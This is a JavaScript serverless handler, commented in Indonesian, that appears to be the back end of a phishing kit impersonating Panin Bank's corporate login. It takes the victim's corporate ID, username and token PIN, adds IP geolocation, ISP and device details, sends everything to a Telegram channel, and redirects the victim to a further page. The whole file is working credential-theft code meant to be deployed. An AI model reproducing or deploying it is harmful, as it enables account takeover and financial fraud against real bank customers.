const { sendMessage, getLocationInfo, getDeviceInfo } = require('../utils');

/**
 * Serverless Function untuk menangani login tahap 1 (menggantikan auth/1.php).
 * @param {object} req - Objek permintaan (request).
 * @param {object} res - Objek respons (response).
 */
module.exports = async (req, res) => {
    // Hanya menerima metode POST
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    // Ambil data dari body permintaan
    const { j_corp_id, j_username, j_token_pin } = req.body;

    // Validasi input wajib
    if (!j_corp_id || !j_username || !j_token_pin) {
        res.status(400).send('Formulir tidak lengkap. Harap isi semua kolom.');
        return;
    }

    // Ambil informasi IP dan User-Agent
    // Di Vercel, IP bisa didapatkan dari header 'x-forwarded-for'
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Tidak Diketahui';
    const userAgent = req.headers['user-agent'] || 'Tidak Diketahui';

    // Dapatkan informasi lokasi dan perangkat secara paralel
    const [locationInfo, deviceInfo] = await Promise.all([
        getLocationInfo(ip.split(',')[0].trim()), // Ambil IP pertama jika ada beberapa
        getDeviceInfo(userAgent)
    ]);

    // Format pesan notifikasi Telegram
    const message = `
    --- 🏦 Panin Bank Login 1 ---

    - ID Perusahaan : ${j_corp_id}
    - ID Pengguna   : ${j_username}  
    - Kode Token    : ${j_token_pin}

    --- ℹ️ Informasi Pengunjung ---
    - Alamat IP     : ${ip.split(',')[0].trim()}
    - Negara        : ${locationInfo.country}
    - Kota          : ${locationInfo.city}
    - Wilayah       : ${locationInfo.region}
    - ISP           : ${locationInfo.isp}
    - Perangkat     : ${deviceInfo.device}
    - Sistem Operasi: ${deviceInfo.os}
    - Browser       : ${deviceInfo.browser}
    ------------------------------
    `;

    // Kirim pesan ke Telegram
    await sendMessage(message);

    // Kirim respons sukses dan arahkan ke halaman berikutnya
    // Karena ini adalah API, kita kirim respons JSON, dan client-side JS akan melakukan redirect
    res.status(200).json({
        success: true,
        redirect: '/ubah.html' // Halaman berikutnya
    });
};
